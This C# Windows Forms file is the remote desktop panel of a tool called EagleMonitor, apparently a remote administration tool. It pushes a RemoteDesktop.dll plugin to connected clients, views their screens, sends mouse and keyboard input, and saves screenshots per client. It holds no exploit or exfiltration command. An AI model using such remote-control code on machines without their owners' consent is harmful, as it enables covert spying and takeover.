using EagleMonitor.Controls;
using EagleMonitor.Networking;
using PacketLib;
using PacketLib.Packet;
using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace EagleMonitor.Forms
{
    //Note : Form.KeyPreview to True to get event working
    public partial class RemoteDesktopForm : FormPattern
    {
        internal ClientHandler clientHandler { get; set; }
        public bool hasAlreadyConnected { get; set; }
        private string baseIp { get; set; }
        private int currentPanelHeight { get; set; }
        internal bool enabledMouse { get; set; }
        internal bool enableKeyboard { get; set; }

        internal int vResol { get; set; }
        internal int hResol { get; set; }

        private readonly List<Keys> keysPressed;

        internal RemoteDesktopForm(string baseIp)
        {
            this.baseIp = baseIp;
            InitializeComponent();
            this.currentPanelHeight = panel1.Height;
            keysPressed = new List<Keys>();
        }
      
        private void captureGuna2ToggleSwitch_CheckedChanged(object sender, EventArgs e)
        {
            if (captureGuna2ToggleSwitch.Checked)
            {
                RemoteViewerPacket remoteViewerPacket = new RemoteViewerPacket(PacketType.RM_VIEW_ON)
                {
                    plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\RemoteDesktop.dll"), 1),
                    baseIp = this.baseIp,
                    width = viewerPictureBox.Width,
                    height = viewerPictureBox.Height,
                    format = "JPEG",
                    quality = qualityGuna2TrackBar.Value,
                    timeMS = 1
                };

                this.loadingCircle1.Visible = true;
                this.loadingCircle1.Active = true;
                ClientHandler.ClientHandlersList[baseIp].SendPacket(remoteViewerPacket);
            }
            else 
            {
                this.loadingCircle1.Visible = false;
                this.loadingCircle1.Active = false;
                RemoteViewerPacket remoteViewerPacket = new RemoteViewerPacket(PacketType.RM_VIEW_OFF)
                {
                    baseIp = this.baseIp,
                    HWID = ClientHandler.ClientHandlersList[baseIp].HWID
                };
                this.clientHandler.SendPacket(remoteViewerPacket);
            }
        }

        private void mouseGuna2ToggleSwitch_CheckedChanged(object sender, EventArgs e)
        {
            if (mouseGuna2ToggleSwitch.Checked)
            { this.enabledMouse = true; this.viewerPictureBox.MouseWheel += viewerPictureBox_MouseWheel; }
            else
            { this.enabledMouse = false; this.viewerPictureBox.MouseWheel -= viewerPictureBox_MouseWheel; }
        }

        private void keyboardGuna2ToggleSwitch_CheckedChanged(object sender, EventArgs e)
        {
            if (keyboardGuna2ToggleSwitch.Checked)
            { this.enableKeyboard = true; }
            else
            { this.enableKeyboard = false; }
        }

        private void qualityGuna2TrackBar_ValueChanged(object sender, EventArgs e)
        {
            if (captureGuna2ToggleSwitch.Checked)
            {
                RemoteViewerPacket remoteViewerPacket = new RemoteViewerPacket(PacketType.RM_VIEW_ON)
                {
                    plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\RemoteDesktop.dll"), 1),
                    baseIp = this.baseIp,
                    width = viewerPictureBox.Width,
                    height = viewerPictureBox.Height,
                    format = "JPEG",
                    quality = qualityGuna2TrackBar.Value,
                    timeMS = 1
                };
                this.clientHandler.SendPacket(remoteViewerPacket);
            }
        }

        private void viewerPictureBox_SizeChanged(object sender, EventArgs e)
        {
            if (captureGuna2ToggleSwitch.Checked)
            {
                RemoteViewerPacket remoteViewerPacket = new RemoteViewerPacket(PacketType.RM_VIEW_ON)
                {
                    plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\RemoteDesktop.dll"), 1),
                    baseIp = this.baseIp,
                    width = viewerPictureBox.Width,
                    height = viewerPictureBox.Height,
                    format = "JPEG",
                    quality = qualityGuna2TrackBar.Value,
                    timeMS = 1
                };

                this.clientHandler.SendPacket(remoteViewerPacket);
            }
        }


        private void intervalGuna2TextBox_TextChanged(object sender, EventArgs e)
        {
            if (captureGuna2ToggleSwitch.Checked) 
            {
                RemoteViewerPacket remoteViewerPacket = new RemoteViewerPacket(PacketType.RM_VIEW_ON)
                {
                    baseIp = this.baseIp,
                    plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\RemoteDesktop.dll"), 1),
                    width = viewerPictureBox.Width,
                    height = viewerPictureBox.Height,
                    format = "JPEG",
                    quality = qualityGuna2TrackBar.Value,
                    timeMS = 1
                };

                this.clientHandler.SendPacket(remoteViewerPacket);
            }
        }

        private void viewerPictureBox_MouseWheel(object sender, MouseEventArgs e)
        {
            if (enabledMouse)
            {
                RemoteMousePacket mousePacket = new RemoteMousePacket(e.Delta == 120 ? RemoteMousePacket.MouseTypeAction.MOVE_WHEEL_UP : RemoteMousePacket.MouseTypeAction.MOVE_WHEEL_DOWN)
                {
                    x = e.X * hResol / viewerPictureBox.Width,
                    y = e.Y * vResol / viewerPictureBox.Height
                };
                this.clientHandler.SendPacket(mousePacket);
            }
        }

        private void viewerPictureBox_MouseDown(object sender, MouseEventArgs e)
        {
            if (enabledMouse)
            {
               RemoteMousePacket mousePacket =  new RemoteMousePacket(RemoteMousePacket.MouseTypeAction.UNKNOWN);
                if (e.Button == MouseButtons.Left)
                    mousePacket.mouseTypeAction = RemoteMousePacket.MouseTypeAction.LEFT_DOWN;

                if(e.Button == MouseButtons.Right)
                    mousePacket.mouseTypeAction = RemoteMousePacket.MouseTypeAction.RIGHT_DOWN;

                if (e.Button == MouseButtons.Middle)
                    mousePacket.mouseTypeAction = RemoteMousePacket.MouseTypeAction.MIDDLE_DOWN;

                mousePacket.x = e.X * hResol / viewerPictureBox.Width;
                mousePacket.y = e.Y * vResol / viewerPictureBox.Height;
                this.clientHandler.SendPacket(mousePacket);
            }
        }

        private void viewerPictureBox_MouseMove(object sender, MouseEventArgs e)
        {
            if (enabledMouse) 
            {
                this.clientHandler.SendPacket(new RemoteMousePacket
                    (
                        RemoteMousePacket.MouseTypeAction.MOVE_MOUSE,
                        e.X * hResol / viewerPictureBox.Width, 
                        e.Y * vResol / viewerPictureBox.Height)
                    );
            }
        }

        private void viewerPictureBox_MouseUp(object sender, MouseEventArgs e)
        {
            if (enabledMouse)
            {
                RemoteMousePacket mousePacket = new RemoteMousePacket(RemoteMousePacket.MouseTypeAction.UNKNOWN);
                if (e.Button == MouseButtons.Left)
                    mousePacket.mouseTypeAction = RemoteMousePacket.MouseTypeAction.LEFT_UP;

                if (e.Button == MouseButtons.Right)
                    mousePacket.mouseTypeAction = RemoteMousePacket.MouseTypeAction.RIGHT_UP;

                if(e.Button == MouseButtons.Middle)
                    mousePacket.mouseTypeAction = RemoteMousePacket.MouseTypeAction.MIDDLE_UP;

                mousePacket.x = e.X * hResol / viewerPictureBox.Width;
                mousePacket.y = e.Y * vResol / viewerPictureBox.Height;
                this.clientHandler.SendPacket(mousePacket);
            }
        }

        private void RemoteDesktopForm_KeyDown(object sender, KeyEventArgs e)
        {
            if (enableKeyboard)
            {
                if (!IsLockKey(e.KeyCode))
                    e.Handled = true;

                if (keysPressed.Contains(e.KeyCode))
                    return;

                keysPressed.Add(e.KeyCode);
                this.clientHandler.SendPacket(new RemoteKeyboardPacket((byte)e.KeyCode, true));
            }
        }

        private void RemoteDesktopForm_KeyUp(object sender, KeyEventArgs e)
        {
            if (enableKeyboard)
            {
                if (!IsLockKey(e.KeyCode))
                    e.Handled = true;
                keysPressed.Remove(e.KeyCode);
                this.clientHandler.SendPacket(new RemoteKeyboardPacket((byte)e.KeyCode, false));
            }
        }

        private bool IsLockKey(Keys key)
        {
            return ((key & Keys.CapsLock) == Keys.CapsLock)
                   || ((key & Keys.NumLock) == Keys.NumLock)
                   || ((key & Keys.Scroll) == Keys.Scroll);
        }


        private void hidePanelToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new Thread(() =>
            {
                while (panel1.Height > panel2.Height)
                {
                    panel1.Height -= 2;
                    Thread.Sleep(10);
                }
            }).Start();
        }

        private void showPanelToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new Thread(() =>
            {
                while (currentPanelHeight > panel1.Height)
                {
                    panel1.Height += 2;
                    Thread.Sleep(10);
                }
            }).Start();
        }

        private void saveCurrentPcitureToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (Directory.Exists(ClientHandler.ClientHandlersList[baseIp].clientPath + "\\" + "Screenshots") == false)
                Directory.CreateDirectory(ClientHandler.ClientHandlersList[baseIp].clientPath + "\\" + "Screenshots");

            string Date = DateTime.UtcNow.DayOfYear.ToString() + DateTime.UtcNow.Hour.ToString() + DateTime.UtcNow.Minute.ToString() + DateTime.UtcNow.Second.ToString() + DateTime.UtcNow.Millisecond.ToString();

            File.WriteAllBytes(ClientHandler.ClientHandlersList[baseIp].clientPath + "\\" + "Screenshots\\" + Date + ".jpeg", PacketLib.Utils.ImageProcessing.ImageToBytes(this.viewerPictureBox.Image));
        }

        private void closeButton_Click(object sender, EventArgs e)
        {
            if (captureGuna2ToggleSwitch.Checked)
            {
                RemoteViewerPacket remoteViewerPacket = new RemoteViewerPacket(PacketType.RM_VIEW_OFF)
                {
                    baseIp = this.baseIp,
                    HWID = ClientHandler.ClientHandlersList[baseIp].HWID
                };
                this.clientHandler.SendPacket(remoteViewerPacket);
            }
            this.Close();
        }

        private void maximizeButton_Click(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Normal)
            {
                this.WindowState = FormWindowState.Maximized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }

        private void minimizeButton_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void label3_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(this.FindForm().Handle, 161, 2, 0);
        }
    }
}
